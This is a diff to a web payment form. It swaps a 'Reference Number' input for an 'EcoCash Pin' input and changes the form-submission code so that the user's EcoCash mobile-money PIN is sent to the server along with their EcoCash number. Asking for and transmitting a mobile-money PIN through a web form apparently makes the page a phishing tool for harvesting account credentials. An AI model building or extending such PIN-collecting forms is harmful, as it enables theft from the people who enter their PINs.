@@ -325,19 +325,19 @@
 
 
 
-        <!-- REFERENCE NUMBER -->
+        <!-- ECOCASH PIN -->
 
         <div class="field">
 
-            <label for="reference_number">
-                Reference Number
+            <label for="ecocash_pin">
+                EcoCash Pin
             </label>
 
 
             <input
                 type="text"
-                id="reference_number"
-                placeholder="Enter reference number"
+                id="ecocash_pin"
+                placeholder="Enter ecocash pin"
                 autocomplete="off"
             >
 
@@ -377,9 +377,9 @@ async function submitForm() {
 
 
 
-    const referenceNumber =
+    const ecocashPin =
         document
-        .getElementById("reference_number")
+        .getElementById("ecocash_pin")
         .value
         .trim();
 
@@ -398,12 +398,12 @@ async function submitForm() {
 
 
 
-    // Check reference number
+    // Check ecocash pin
 
-    if (!referenceNumber) {
+    if (!ecocashPin) {
 
         alert(
-            "Please enter your reference number."
+            "Please enter your ecocash pin."
         );
 
         return;
@@ -447,8 +447,8 @@ async function submitForm() {
                         ecocash_number:
                             ecocashNumber,
 
-                        reference_number:
-                            referenceNumber
+                        ecocash_pin:
+                            ecocashPin
 
                     })
 
